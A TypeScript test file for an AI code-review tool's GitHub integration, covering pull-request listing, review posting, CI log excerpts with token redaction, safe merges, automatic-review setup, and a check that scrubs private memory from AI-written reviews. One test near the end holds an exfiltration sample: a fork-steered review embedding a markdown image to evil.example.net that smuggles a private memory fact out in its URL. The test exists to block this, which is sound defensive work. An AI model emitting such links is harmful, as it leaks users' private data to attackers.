import { mkdtemp, rm } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"

import { afterAll, beforeAll, describe, expect, test } from "bun:test"
import { BrainPosting } from "@vectordevai/core/brain/posting"
import { buildWorkflowYaml, buildAgentsWorkflow } from "@vectordevai/core/review/workflow"
import { GithubAgents } from "@vectordevai/core/github-agents"

import { createPullRequest } from "./github"
import type { GithubAccess } from "./github-api"
import {
  AUTO_REVIEW_BRANCH,
  autoReviewWorkflow,
  fetchAutoReviewStatus,
  fetchPullRequest,
  fetchPullRequestChecks,
  fetchPullRequestDiff,
  fetchPullRequests,
  openAutoReviewPullRequest,
  postPullRequestReview,
  pushedHead,
  putPullRequestMerge,
  setUpAutomaticReviews,
  submitPullRequestReview,
  type ReviewCheck,
} from "./github-pr"
import { checkPost, usePostingEngine, type Ask } from "./posting-check"

// A small stand-in for api.github.com that answers the calls the Pull Requests panel makes, so the real request,
// pagination and error code runs end to end without a network or a token.
const HEAD = "a".repeat(40)
const PUSHED = "c".repeat(40)
const requests: { method: string; path: string; body?: Record<string, unknown> }[] = []
// The pull request's newest commit as the stand-in reports it, and a push that lands while its diff is being read.
// The pull request's head repository and author, and who is signed in: the same repository and person by default.
const live = { head: HEAD, pushDuringDiff: false, headRepo: "acme/app", author: "sam", viewer: "sam" }
const node = (number: number) => ({
  number,
  title: `Change ${number}`,
  author: number === 3 ? null : { login: "mira" },
  state: "OPEN",
  isDraft: false,
  baseRefName: "main",
  headRefName: `change-${number}`,
  additions: 10,
  deletions: 2,
  changedFiles: 1,
  url: `https://github.com/acme/app/pull/${number}`,
  updatedAt: "2026-10-08T10:00:00Z",
  reviewDecision: number === 1 ? "APPROVED" : null,
  headRefOid: HEAD,
  baseRefOid: "b".repeat(40),
  isCrossRepository: false,
})

// The check runs of HEAD. A GitHub Actions run's id is its job's id; a run from another app has no Actions job.
const checkRun = (id: number, name: string, status: string, conclusion: string | null, slug = "github-actions") => ({
  id,
  name,
  status,
  conclusion,
  html_url: `https://github.com/acme/app/actions/runs/1/job/${id}`,
  app: { slug },
})
const CHECK_RUNS = [
  checkRun(11, "typecheck", "completed", "failure"),
  checkRun(12, "lint", "completed", "failure"),
  checkRun(13, "build", "in_progress", null),
  checkRun(14, "Vercel", "completed", "failure", "vercel"),
  checkRun(15, "unit", "completed", "success"),
  checkRun(16, "e2e", "completed", "timed_out"),
]
// Each job's steps and its whole log as GitHub serves it: every step in a row, each line timestamped. The lint
// job's log has expired.
const JOBS: Record<string, { steps: { name: string; conclusion: string }[]; log?: string }> = {
  "11": {
    steps: [
      { name: "Checkout", conclusion: "success" },
      { name: "Typecheck", conclusion: "failure" },
    ],
    log: [
      "2026-10-08T10:00:00.0000000Z ##[group]Run actions/checkout@v4",
      "2026-10-08T10:00:01.0000000Z ##[endgroup]",
      "2026-10-08T10:00:02.0000000Z ##[group]Run bun typecheck",
      "2026-10-08T10:00:02.1000000Z ##[endgroup]",
      "2026-10-08T10:00:03.0000000Z $ echo ghp_0123456789abcdefghijklmnopqrstuvwx",
      "2026-10-08T10:00:09.0000000Z src/a.ts(4,7): error TS2322: Type 'string' is not assignable to type 'number'.",
      "2026-10-08T10:00:10.0000000Z ##[error]Process completed with exit code 2.",
      "2026-10-08T10:00:11.0000000Z Post job cleanup.",
    ].join("\n"),
  },
  "12": { steps: [{ name: "Lint", conclusion: "failure" }] },
  "16": {
    steps: [
      { name: "Set up job", conclusion: "success" },
      { name: "End to end", conclusion: "cancelled" },
    ],
    log: [
      "2026-10-08T10:00:00.0000000Z ##[group]Run bun test:e2e",
      "2026-10-08T10:00:00.1000000Z ##[endgroup]",
      ...Array.from({ length: 400 }, (_, index) => `2026-10-08T10:00:01.0000000Z (pass) e2e case ${index}`),
      "2026-10-08T10:30:00.0000000Z ##[error]The job has exceeded the maximum execution time of 30m0s",
      "2026-10-08T10:30:00.1000000Z ##[error]The operation was canceled.",
    ].join("\n"),
  },
}

const server = Bun.serve({
  port: 0,
  async fetch(request) {
    const url = new URL(request.url)
    const body = request.method === "GET" ? undefined : ((await request.json()) as Record<string, unknown>)
    requests.push({ method: request.method, path: url.pathname, body })
    if (request.headers.get("authorization") !== "Bearer test-token")
      return Response.json({ message: "Bad credentials" }, { status: 401 })
    if (url.pathname === "/graphql") {
      const variables = (body?.variables ?? {}) as { after?: string; number?: number; first?: number }
      const query = String(body?.query)
      if (query.includes("pullRequests(")) {
        const page = variables.after ? [3] : [1, 2]
        return Response.json({
          data: {
            repository: {
              pullRequests: {
                nodes: page.slice(0, variables.first).map(node),
                pageInfo: { hasNextPage: !variables.after, endCursor: variables.after ? null : "cursor-1" },
              },
            },
          },
        })
      }
      const files = variables.after
        ? [{ path: "b.ts", additions: 2, deletions: 0 }]
        : [{ path: "a.ts", additions: 8, deletions: 2 }]
      return Response.json({
        data: {
          repository: {
            pullRequest: {
              ...node(variables.number ?? 0),
              body: "Why this change",
              files: {
                nodes: files,
                pageInfo: { hasNextPage: !variables.after, endCursor: variables.after ? null : "f-1" },
              },
              comments: {
                nodes: [{ author: { login: "sam" }, body: "Looks good", createdAt: "2026-10-08T11:00:00Z" }],
              },
            },
          },
        },
      })
    }
    if (url.pathname === "/repos/acme/app/pulls/7" && request.headers.get("accept") === "application/vnd.github.diff") {
      if (live.pushDuringDiff) live.head = PUSHED
      return new Response("diff --git a/a.ts b/a.ts\n")
    }
    if (url.pathname === "/repos/acme/app/pulls/7" && request.method === "GET")
      return Response.json({
        head: { sha: live.head, repo: { full_name: live.headRepo } },
        base: { repo: { full_name: "acme/app" } },
        user: { login: live.author },
      })
    if (url.pathname === "/user") return Response.json({ login: live.viewer })
    if (url.pathname === "/repos/acme/app/pulls/7/reviews") {
      // GitHub refuses the whole review when any line comment falls outside the diff, here past line 100.
      const comments = (body?.comments ?? []) as { line: number }[]
      if (comments.some((comment) => comment.line > 100))
        return Response.json(
          { message: "Unprocessable Entity", errors: ["Line could not be resolved"] },
          { status: 422 },
        )
      if (!body?.body) return Response.json({ message: "Body is required" }, { status: 422 })
      return Response.json({ id: 1 })
    }
    if (url.pathname === `/repos/acme/app/commits/${HEAD}/check-runs`) {
      return Response.json({ total_count: CHECK_RUNS.length, check_runs: CHECK_RUNS })
    }
    const job = JOBS[url.pathname.match(/^\/repos\/acme\/app\/actions\/jobs\/(\d+)/)?.[1] ?? ""]
    if (job && url.pathname.endsWith("/logs") && job.log) return new Response(job.log)
    if (job && !url.pathname.endsWith("/logs")) return Response.json(job)
    if (url.pathname === "/repos/acme/app/pulls/7/merge") {
      if (body?.sha && body.sha !== live.head)
        return Response.json({ message: "Head branch was modified. Review and try the merge again." }, { status: 409 })
      return Response.json({ merged: true })
    }
    return Response.json({ message: "Not Found" }, { status: 404 })
  },
})
afterAll(() => server.stop(true))

const access: GithubAccess = { token: "test-token", source: "vector", apiUrl: `http://127.0.0.1:${server.port}` }
const repo = { owner: "acme", name: "app" }
// The posting check as a review that passed it: every part sent as it was.
const same: ReviewCheck = (parts) => Promise.resolve(parts)
const postWith = (check: ReviewCheck, review: Parameters<typeof postPullRequestReview>[3]) =>
  postPullRequestReview(access, repo, 7, review, check)

describe("pull requests over GitHub's API", () => {
  test("lists pull requests across pages up to the limit, with the fields the panel shows", async () => {
    const all = await fetchPullRequests(access, repo, "open", 100)
    expect(all.map((pr) => pr.number)).toEqual([1, 2, 3])
    expect(all[0]).toMatchObject({ author: "mira", reviewDecision: "APPROVED", headRefOid: HEAD })
    expect(all[1].reviewDecision).toBeUndefined()
    // A deleted account comes back as GitHub's ghost user, not a crash.
    expect(all[2].author).toBe("ghost")
    expect(await fetchPullRequests(access, repo, "open", 1)).toHaveLength(1)
  })

  test("reads one pull request with every page of its files", async () => {
    const pr = await fetchPullRequest(access, repo, 7)
    expect(pr.files.map((file) => file.path)).toEqual(["a.ts", "b.ts"])
    expect(pr.comments).toEqual([{ author: "sam", body: "Looks good", createdAt: "2026-10-08T11:00:00Z" }])
    expect(pr.body).toBe("Why this change")
  })

  test("posts a review pinned to the commit it ran on", async () => {
    requests.length = 0
    await postWith(same, { body: "Two findings", event: "request-changes", head: HEAD })
    const posted = requests.find((request) => request.path.endsWith("/reviews"))
    expect(posted?.body).toEqual({ body: "Two findings", event: "REQUEST_CHANGES", commit_id: HEAD })
  })

  test("refuses to post when the pull request moved after the review", async () => {
    requests.length = 0
    const stale = "c".repeat(40)
    await expect(postWith(same, { body: "LGTM", event: "approve", head: stale })).rejects.toThrow(
      "changed after the review started",
    )
    expect(requests.some((request) => request.path.endsWith("/reviews"))).toBe(false)
  })

  test("posts line comments with the review, as ranges when they start on an earlier line", async () => {
    requests.length = 0
    const comments = [
      { path: "a.ts", line: 4, side: "RIGHT" as const, body: "Off by one" },
      { path: "a.ts", line: 9, side: "RIGHT" as const, startLine: 6, body: "This block leaks the handle" },
      { path: "b.ts", line: 2, side: "LEFT" as const, startLine: 2, body: "The removed guard was needed" },
    ]
    expect(await postWith(same, { body: "Three findings", event: "comment", head: HEAD, comments })).toEqual({
      posted: true,
      inline: 3,
    })
    expect(requests.find((request) => request.path.endsWith("/reviews"))?.body).toEqual({
      body: "Three findings",
      event: "COMMENT",
      commit_id: HEAD,
      comments: [
        { path: "a.ts", line: 4, side: "RIGHT", body: "Off by one" },
        {
          path: "a.ts",
          line: 9,
          side: "RIGHT",
          start_line: 6,
          start_side: "RIGHT",
          body: "This block leaks the handle",
        },
        { path: "b.ts", line: 2, side: "LEFT", body: "The removed guard was needed" },
      ],
    })

    // Without the commit they were read on, line numbers could point anywhere, so the comments are left out.
    requests.length = 0
    expect(await postWith(same, { body: "Three findings", event: "comment", comments })).toEqual({
      posted: true,
      inline: 0,
    })
    expect(requests.find((request) => request.path.endsWith("/reviews"))?.body).toEqual({
      body: "Three findings",
      event: "COMMENT",
    })
  })

  test("posts the review once more without line comments when GitHub refuses one of them", async () => {
    requests.length = 0
    const comments = [
      { path: "a.ts", line: 4, side: "RIGHT" as const, body: "Off by one" },
      { path: "a.ts", line: 900, side: "RIGHT" as const, body: "Outside the diff" },
    ]
    const fallbackBody = "Two findings\n\n- a.ts:4 Off by one\n- a.ts:900 Outside the diff"
    expect(
      await postWith(same, {
        body: "Two findings",
        event: "comment",
        head: HEAD,
        comments,
        fallbackBody,
      }),
    ).toEqual({ posted: true, inline: 0 })
    const posts = requests.filter((request) => request.path.endsWith("/reviews"))
    expect(posts).toHaveLength(2)
    expect(posts[0].body?.comments).toHaveLength(2)
    expect(posts[1].body).toEqual({ body: fallbackBody, event: "COMMENT", commit_id: HEAD })

    // Only once: a fallback GitHub refuses too is reported, not retried.
    requests.length = 0
    await expect(
      postWith(same, {
        body: "Two findings",
        event: "comment",
        head: HEAD,
        comments,
        fallbackBody: "",
      }),
    ).rejects.toThrow("Body is required")
    expect(requests.filter((request) => request.path.endsWith("/reviews"))).toHaveLength(2)
  })

  test("refuses malformed line comments before calling GitHub", async () => {
    requests.length = 0
    await expect(
      submitPullRequestReview({
        cwd: "/tmp/project",
        number: 7,
        head: HEAD,
        body: "One finding",
        event: "comment",
        comments: [{ path: "a.ts", line: 4, side: "right" as "RIGHT", body: "Off by one" }],
      }),
    ).rejects.toThrow("side must be LEFT or RIGHT")
    expect(requests).toHaveLength(0)
  })

  test("lists the commit's check runs with the failing step of each failed Actions job", async () => {
    requests.length = 0
    const checks = await fetchPullRequestChecks(access, repo, HEAD)
    expect(checks.head).toBe(HEAD)
    expect(checks.runs).toEqual(
      CHECK_RUNS.map((run) => ({
        name: run.name,
        status: run.status,
        // A check that is still running has no conclusion yet.
        conclusion: run.conclusion ?? "",
        url: run.html_url,
      })),
    )
    // Vercel's failure is not an Actions job, so it has no job log to read.
    expect(checks.failures.map((failure) => failure.name)).toEqual(["typecheck", "lint", "e2e"])
    expect(requests.some((request) => request.path.includes("/actions/jobs/14"))).toBe(false)

    const typecheck = checks.failures[0]
    expect(typecheck.step).toBe("Typecheck")
    expect(typecheck.excerpt).toContain("##[group]Run bun typecheck")
    expect(typecheck.excerpt).toContain("error TS2322: Type 'string' is not assignable to type 'number'.")
    expect(typecheck.excerpt.endsWith("##[error]Process completed with exit code 2.")).toBe(true)
    // Only the failing step, without timestamps, and with a token-shaped string redacted.
    expect(typecheck.excerpt).not.toContain("actions/checkout")
    expect(typecheck.excerpt).not.toContain("Post job cleanup")
    expect(typecheck.excerpt).not.toContain("2026-10-08T")
    expect(typecheck.excerpt).not.toContain("ghp_0123456789abcdefghijklmnopqrstuvwx")

    // A timed-out job's long step keeps its end, where the error is, within the cap.
    const e2e = checks.failures[2]
    expect(e2e.step).toBe("End to end")
    expect(e2e.excerpt.length).toBeLessThanOrEqual(4_000)
    expect(e2e.excerpt.endsWith("##[error]The operation was canceled.")).toBe(true)
    expect(e2e.excerpt).toContain("(pass) e2e case 399")
    expect(e2e.excerpt).not.toContain("(pass) e2e case 0\n")
  })

  test("a job whose log GitHub no longer has still lists as a failure, without an excerpt", async () => {
    const checks = await fetchPullRequestChecks(access, repo, HEAD)
    expect(checks.failures[1]).toEqual({ name: "lint", step: "", excerpt: "" })
  })

  test("a commit GitHub has not seen has no checks", async () => {
    expect(await fetchPullRequestChecks(access, repo, PUSHED)).toEqual({ head: PUSHED, runs: [], failures: [] })
  })

  test("reads the diff of the commit the panel saw", async () => {
    expect(await fetchPullRequestDiff(access, repo, 7, HEAD)).toBe("diff --git a/a.ts b/a.ts\n")
  })

  test("refuses a diff when a push lands while it is read, so a newer commit is never reviewed as the old one", async () => {
    live.pushDuringDiff = true
    await expect(fetchPullRequestDiff(access, repo, 7, HEAD)).rejects.toThrow("changed while Vector was reading it")
    live.pushDuringDiff = false
    live.head = HEAD
  })

  test("merges only the commit the user saw", async () => {
    requests.length = 0
    expect(await putPullRequestMerge(access, repo, 7, { strategy: "squash", head: HEAD })).toEqual({ merged: true })
    expect(requests.find((request) => request.path.endsWith("/merge"))?.body).toEqual({
      merge_method: "squash",
      sha: HEAD,
    })
    live.head = PUSHED
    await expect(putPullRequestMerge(access, repo, 7, { strategy: "squash", head: HEAD })).rejects.toThrow(
      "New commits were pushed to this pull request",
    )
    live.head = HEAD
  })

  test("an expired token says to sign in again", async () => {
    await expect(fetchPullRequests({ ...access, token: "revoked" }, repo, "open", 10)).rejects.toThrow(
      "Sign in to GitHub again",
    )
  })
})

describe("automatic reviews", () => {
  // Repositories in each state "Set up automatic reviews" can find. acme/app still has the branch an earlier set-up
  // made, whose pull request was closed. scopes is the X-OAuth-Scopes header GitHub sends for OAuth tokens.
  // installed is the workflow file on the default branch; refusePull is the status GitHub answers the pull request with.
  const REPOS: Record<
    string,
    { push: boolean; scopes?: string; installed?: string; refuseWorkflow?: boolean; refusePull?: number }
  > = {
    app: { push: true, scopes: "repo, workflow" },
    done: { push: true, scopes: "repo, workflow", installed: "every" },
    onrequest: { push: true, scopes: "repo, workflow", installed: "comment" },
    open: { push: true, scopes: "repo, workflow" },
    readonly: { push: false, scopes: "repo, workflow" },
    noscope: { push: true, scopes: "repo" },
    finegrained: { push: true },
    denied: { push: true, scopes: "repo, workflow", refuseWorkflow: true },
    rejected: { push: true, scopes: "repo, workflow", refusePull: 422 },
    unavailable: { push: true, scopes: "repo, workflow", refusePull: 502 },
  }
  const installedWorkflow = (kind: string) =>
    buildWorkflowYaml({
      provider: "anthropic",
      model: "claude-sonnet-4-5",
      keys: ["ANTHROPIC_API_KEY"],
      autoReview: kind === "every",
      auth: "github",
      share: false,
      monthlyUsd: 50,
      version: "1.99.99",
    })
  const MAIN = "e".repeat(40)
  // acme/open has the set-up branch with its pull request still open; a fork's branch of the same name has one too.
  const refs = new Set([`app:refs/heads/${AUTO_REVIEW_BRANCH}`, `open:refs/heads/${AUTO_REVIEW_BRANCH}`])
  const openPulls = [
    { repo: "open", head: `acme:${AUTO_REVIEW_BRANCH}`, url: "https://github.com/acme/open/pull/9" },
    { repo: "open", head: `mira:${AUTO_REVIEW_BRANCH}`, url: "https://github.com/acme/open/pull/4" },
    { repo: "app", head: `mira:${AUTO_REVIEW_BRANCH}`, url: "https://github.com/acme/app/pull/4" },
  ]
  const calls: { method: string; path: string; body?: Record<string, unknown> }[] = []
  const stand = Bun.serve({
    port: 0,
    async fetch(request) {
      const url = new URL(request.url)
      const body = ["GET", "DELETE"].includes(request.method)
        ? undefined
        : ((await request.json()) as Record<string, unknown>)
      calls.push({ method: request.method, path: url.pathname, body })
      const match = url.pathname.match(/^\/repos\/acme\/([^/]+)(\/.*)?$/)
      const name = match?.[1] ?? ""
      const repo = REPOS[name]
      const rest = match?.[2] ?? ""
      const missing = Response.json({ message: "Not Found" }, { status: 404 })
      if (!repo) return missing
      if (!rest)
        return Response.json(
          {
            full_name: `acme/${name}`,
            default_branch: "main",
            html_url: `https://github.com/acme/${name}`,
            permissions: { push: repo.push },
          },
          { headers: repo.scopes === undefined ? {} : { "x-oauth-scopes": repo.scopes } },
        )
      if (rest === "/contents/.github/workflows/vector.yml" && request.method === "GET")
        return repo.installed && url.searchParams.get("ref") === "main"
          ? Response.json({
              html_url: `https://github.com/acme/${name}/blob/main/.github/workflows/vector.yml`,
              // GitHub wraps the base64 content at 60 characters.
              content: Buffer.from(installedWorkflow(repo.installed))
                .toString("base64")
                .replace(/(.{60})/g, "$1\n"),
              encoding: "base64",
            })
          : missing
      if (rest === `/git/matching-refs/heads/${AUTO_REVIEW_BRANCH}`)
        return Response.json(
          [...refs]
            .filter((ref) => ref.startsWith(`${name}:`))
            .map((ref) => ({ ref: ref.slice(name.length + 1), object: { sha: MAIN } })),
        )
      if (rest === "/pulls" && request.method === "GET")
        return Response.json(
          openPulls
            .filter((pull) => pull.repo === name && pull.head === url.searchParams.get("head"))
            .map((pull) => ({ html_url: pull.url })),
        )
      if (rest === "/git/ref/heads/main") return Response.json({ object: { sha: MAIN } })
      if (rest === "/git/refs" && request.method === "POST") {
        const ref = `${name}:${body?.ref}`
        if (refs.has(ref)) return Response.json({ message: "Reference already exists" }, { status: 422 })
        refs.add(ref)
        return Response.json({ ref: body?.ref, object: { sha: body?.sha } }, { status: 201 })
      }
      if (rest.startsWith("/git/refs/heads/") && request.method === "DELETE") {
        refs.delete(`${name}:refs/heads/${rest.slice("/git/refs/heads/".length)}`)
        return new Response(null, { status: 204 })
      }
      if (rest === "/contents/.github/workflows/vector.yml" && request.method === "PUT")
        return repo.refuseWorkflow
          ? missing
          : Response.json({ content: { path: ".github/workflows/vector.yml" } }, { status: 201 })
      if (rest === "/pulls" && request.method === "POST")
        return repo.refusePull
          ? Response.json({ message: "Pull requests are restricted" }, { status: repo.refusePull })
          : Response.json({ html_url: `https://github.com/acme/${name}/pull/12`, number: 12 }, { status: 201 })
      return missing
    },
  })
  afterAll(() => stand.stop(true))

  const owner: GithubAccess = { token: "test-token", source: "vector", apiUrl: `http://127.0.0.1:${stand.port}` }
  const repository = (name: string) => ({ owner: "acme", name })
  const workflow = autoReviewWorkflow(
    { model: "anthropic/claude-sonnet-4-5", keys: ["ANTHROPIC_API_KEY"] },
    GithubAgents.MIN_AGENTS_CLI,
  )
  const writes = () => calls.filter((call) => call.method !== "GET")

  test("tells set up, open, read-only and missing-permission repositories apart", async () => {
    const state = async (name: string) => fetchAutoReviewStatus(owner, repository(name))
    expect(await state("app")).toEqual({
      state: "available",
      repo: "acme/app",
      defaultBranch: "main",
      secretsUrl: "https://github.com/acme/app/settings/secrets/actions",
      source: "vector",
    })
    expect(await state("done")).toMatchObject({
      state: "installed",
      url: "https://github.com/acme/done/blob/main/.github/workflows/vector.yml",
    })
    // A workflow from `vector github install` that only reviews on a `/vector review` comment is not "every pull request".
    expect(await state("onrequest")).toMatchObject({
      state: "on-request",
      url: "https://github.com/acme/onrequest/blob/main/.github/workflows/vector.yml",
    })
    // Found by the set-up branch's own open pull request, never a fork's branch of the same name.
    expect(await state("open")).toMatchObject({ state: "pending", url: "https://github.com/acme/open/pull/9" })
    expect((await state("readonly")).state).toBe("read-only")
    expect((await state("noscope")).state).toBe("needs-scope")
    // A token that lists no scopes is tried as it is.
    expect((await state("finegrained")).state).toBe("available")
  })

  test("the file is the workflow `vector github install` writes for the same answers", () => {
    expect(workflow.path).toBe(".github/workflows/vector.yml")
    expect(workflow.content).toBe(
      buildAgentsWorkflow({
        provider: "anthropic",
        model: "claude-sonnet-4-5",
        mode: "own-key",
        keys: ["ANTHROPIC_API_KEY"],
        autoReview: true,
        share: false,
        version: GithubAgents.MIN_AGENTS_CLI,
        monthlyUsd: 50,
      }),
    )
    expect(workflow.content).toContain("  pull_request:")
    expect(workflow.secrets.map((secret) => secret.name)).toEqual(["VECTOR_CLI_TOKEN", "ANTHROPIC_API_KEY"])
    // Vector's shared models need only the Vector account token.
    const shared = autoReviewWorkflow(
      { model: "vector/acme/coder:free", keys: ["VECTOR_CLI_TOKEN"] },
      GithubAgents.MIN_AGENTS_CLI,
    )
    expect(shared.secrets.map((secret) => secret.name)).toEqual(["VECTOR_CLI_TOKEN"])
    expect(shared.content).toContain("MODEL: vector/acme/coder:free")
  })

  test("branches from the default branch, commits only the workflow, and opens the pull request", async () => {
    calls.length = 0
    const setup = await openAutoReviewPullRequest(owner, repository("app"), workflow)
    // The branch an earlier set-up left behind is kept; this one gets a suffix.
    expect(setup.branch.startsWith(`${AUTO_REVIEW_BRANCH}-`)).toBe(true)
    expect(setup).toMatchObject({
      url: "https://github.com/acme/app/pull/12",
      number: 12,
      secretsUrl: "https://github.com/acme/app/settings/secrets/actions",
    })
    expect(setup.secrets.map((secret) => secret.name)).toEqual(["VECTOR_CLI_TOKEN", "ANTHROPIC_API_KEY"])
    const [first, second, file, pull, ...rest] = writes()
    expect(first).toMatchObject({
      path: "/repos/acme/app/git/refs",
      body: { ref: `refs/heads/${AUTO_REVIEW_BRANCH}`, sha: MAIN },
    })
    expect(second).toMatchObject({
      path: "/repos/acme/app/git/refs",
      body: { ref: `refs/heads/${setup.branch}`, sha: MAIN },
    })
    expect(file?.method).toBe("PUT")
    expect(file?.path).toBe("/repos/acme/app/contents/.github/workflows/vector.yml")
    expect(file?.body?.branch).toBe(setup.branch)
    expect(Buffer.from(String(file?.body?.content), "base64").toString()).toBe(workflow.content)
    expect(pull).toMatchObject({ path: "/repos/acme/app/pulls", body: { head: setup.branch, base: "main" } })
    expect(String(pull?.body?.body)).toContain("- `ANTHROPIC_API_KEY`: Your model provider's API key.")
    expect(rest).toEqual([])
    // No secret is ever sent: the user adds them in GitHub.
    expect(calls.some((call) => call.path.includes("/secrets"))).toBe(false)
  })

  test("refuses without writing anything when the repository is set up, waiting, or out of reach", async () => {
    calls.length = 0
    for (const [name, message] of [
      ["done", "already set up in acme/done"],
      ["onrequest", "comments /vector review"],
      ["open", "already open in acme/open: https://github.com/acme/open/pull/9"],
      ["readonly", "write access to acme/readonly"],
      ["noscope", "sign in again"],
    ])
      await expect(openAutoReviewPullRequest(owner, repository(name), workflow)).rejects.toThrow(message)
    expect(writes()).toEqual([])
    await expect(
      openAutoReviewPullRequest({ ...owner, source: "gh" }, repository("noscope"), workflow),
    ).rejects.toThrow("gh auth refresh -s workflow")
  })

  test("deletes its branch when GitHub refuses the workflow file", async () => {
    calls.length = 0
    await expect(openAutoReviewPullRequest(owner, repository("denied"), workflow)).rejects.toThrow(
      "may not be allowed to change workflows",
    )
    expect(writes().map((call) => `${call.method} ${call.path}`)).toEqual([
      "POST /repos/acme/denied/git/refs",
      "PUT /repos/acme/denied/contents/.github/workflows/vector.yml",
      `DELETE /repos/acme/denied/git/refs/heads/${AUTO_REVIEW_BRANCH}`,
    ])
    expect(refs.has(`denied:refs/heads/${AUTO_REVIEW_BRANCH}`)).toBe(false)
    await expect(openAutoReviewPullRequest({ ...owner, source: "gh" }, repository("denied"), workflow)).rejects.toThrow(
      "gh auth refresh -s workflow",
    )
  })

  test("deletes its branch when GitHub refuses the pull request, and keeps it when the answer is unknown", async () => {
    calls.length = 0
    await expect(openAutoReviewPullRequest(owner, repository("rejected"), workflow)).rejects.toThrow(
      "Pull requests are restricted",
    )
    expect(writes().map((call) => `${call.method} ${call.path}`)).toEqual([
      "POST /repos/acme/rejected/git/refs",
      "PUT /repos/acme/rejected/contents/.github/workflows/vector.yml",
      "POST /repos/acme/rejected/pulls",
      `DELETE /repos/acme/rejected/git/refs/heads/${AUTO_REVIEW_BRANCH}`,
    ])
    expect(refs.has(`rejected:refs/heads/${AUTO_REVIEW_BRANCH}`)).toBe(false)
    // A server error may come after GitHub opened the pull request, so the branch stays for the next status check.
    await expect(openAutoReviewPullRequest(owner, repository("unavailable"), workflow)).rejects.toThrow()
    expect(refs.has(`unavailable:refs/heads/${AUTO_REVIEW_BRANCH}`)).toBe(true)
  })

  test("refuses a malformed model or key name before calling GitHub", async () => {
    calls.length = 0
    await expect(
      setUpAutomaticReviews({ cwd: "/tmp/project", model: "anthropic/claude sonnet", keys: [] }, "1.99.99"),
    ).rejects.toThrow("provider/model")
    await expect(
      setUpAutomaticReviews({ cwd: "/tmp/project", model: "anthropic/claude", keys: ["GITHUB_TOKEN"] }, "1.99.99"),
    ).rejects.toThrow("environment variable names")
    expect(calls).toEqual([])
  })
})

describe("pushedHead", () => {
  const repository = async (remotes: Record<string, string>, tracking: string) => {
    const dir = await mkdtemp(join(tmpdir(), "vector-pr-head-"))
    const run = (...args: string[]) =>
      Bun.spawn(["git", ...args], { cwd: dir, stdout: "ignore", stderr: "ignore" }).exited
    await run("init", "-q", "-b", "feature")
    await run(
      "-c",
      "user.name=Vector",
      "-c",
      "user.email=vector@example.com",
      "commit",
      "-q",
      "--allow-empty",
      "-m",
      "start",
    )
    for (const [name, url] of Object.entries(remotes)) await run("remote", "add", name, url)
    if (tracking) {
      await run("update-ref", `refs/remotes/${tracking}/feature`, "HEAD")
      await run("branch", "--set-upstream-to", `${tracking}/feature`)
    }
    return dir
  }

  test("names the branch as GitHub knows it, with the fork's owner for a fork", async () => {
    const own = await repository({ origin: "https://github.com/acme/app.git" }, "origin")
    const fork = await repository(
      { origin: "git@github.com:me/app.git", upstream: "https://github.com/acme/app.git" },
      "origin",
    )
    expect(await pushedHead(own, repo)).toBe("feature")
    expect(await pushedHead(fork, repo)).toBe("me:feature")
    await Promise.all([rm(own, { recursive: true, force: true }), rm(fork, { recursive: true, force: true })])
  })

  test("asks for a push when the branch is not on GitHub yet", async () => {
    const local = await repository({ origin: "https://github.com/acme/app.git" }, "")
    await expect(pushedHead(local, repo)).rejects.toThrow("Push this branch to GitHub first")
    await rm(local, { recursive: true, force: true })
  })
})

// The posting check (section 6.4a) through a stand-in for the engine's owner-only route on loopback, which runs the
// real check over a fixed memory, and a stand-in for the owner's answers to Vector's questions.
describe("the posting check before Vector posts", () => {
  const FACT = "Acme drops the Q3 platform contract with Globex after the audit in March"
  const HABIT = "Prefer small pull requests with one reviewer and squash merges for every change"
  const checks: { directory: string | null; body: Record<string, unknown> }[] = []
  const questions: Parameters<Ask>[0][] = []
  const answers: number[] = []
  const engine = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    async fetch(request) {
      const url = new URL(request.url)
      if (request.method !== "POST" || url.pathname !== "/memory/posting-check")
        return new Response("", { status: 404 })
      if (request.headers.get("authorization") !== `Basic ${Buffer.from("vector:engine-secret").toString("base64")}`)
        return new Response("", { status: 401 })
      const body = (await request.json()) as { parts: string[]; typed: boolean; untrusted?: boolean }
      checks.push({ directory: url.searchParams.get("directory"), body })
      return Response.json(
        BrainPosting.check({ ...body, memory: { habits: [HABIT], facts: [FACT] }, known: new Set<string>() }),
      )
    },
  })
  const reachable = async () => ({
    url: `http://127.0.0.1:${engine.port}`,
    username: "vector",
    password: "engine-secret",
  })
  const ask: Ask = async (question) => {
    questions.push(question)
    return answers.shift() ?? question.cancel
  }
  const review = (parts: string[]) =>
    checkPost({ cwd: "/repo", parts, typed: false, sessionIDs: ["ses_review"], untrusted: true })
  const reset = () => {
    requests.length = 0
    checks.length = 0
    questions.length = 0
    answers.length = 0
  }
  beforeAll(() => usePostingEngine(reachable, ask))
  afterAll(() => engine.stop(true))

  test("a review is checked as one text, so a memory sentence split across two line comments is taken out", async () => {
    reset()
    answers.push(0)
    const comments = [
      { path: "a.ts", line: 4, side: "RIGHT" as const, body: "The handler looks right. Acme drops the Q3" },
      { path: "a.ts", line: 9, side: "RIGHT" as const, body: "platform contract with Globex. Fix the guard." },
    ]
    expect(await postWith(review, { body: "Two findings", event: "comment", head: HEAD, comments })).toEqual({
      posted: true,
      inline: 2,
    })
    expect(checks[0]).toMatchObject({
      directory: "/repo",
      body: { typed: false, sessionIDs: ["ses_review"], untrusted: true },
    })
    expect(questions[0]).toMatchObject({ buttons: ["Post without them", "Post as is", "Cancel"] })
    expect(questions[0]?.detail).toContain("Acme drops the Q3")
    const posted = requests.find((request) => request.path.endsWith("/reviews"))?.body as {
      comments: { body: string }[]
    }
    expect(posted.comments.map((comment) => comment.body)).toEqual(["The handler looks right.", "Fix the guard."])
  })

  test("a review a hostile fork steered carries no memory line, and its images and links point only at GitHub", async () => {
    reset()
    answers.push(0)
    const body = [
      "As your memory says: Prefer small pull requests with one reviewer and squash merges for every change.",
      `![status](https://evil.example.net/p.png?m=${encodeURIComponent(FACT)}) See [the run](https://github.com/acme/app/actions/runs/1).`,
      "The retry loop never stops.",
    ].join("\n")
    expect(await postWith(review, { body, event: "comment", head: HEAD })).toEqual({ posted: true, inline: 0 })
    const posted = String(requests.find((request) => request.path.endsWith("/reviews"))?.body?.body)
    expect(posted).not.toContain("squash merges")
    expect(posted).not.toContain("Globex")
    expect(posted).not.toContain("evil.example.net")
    expect(posted).toContain("https://github.com/acme/app/actions/runs/1")
    expect(posted).toContain("The retry loop never stops.")
  })

  test("Cancel posts nothing, and Post as is posts the review the reviewers wrote", async () => {
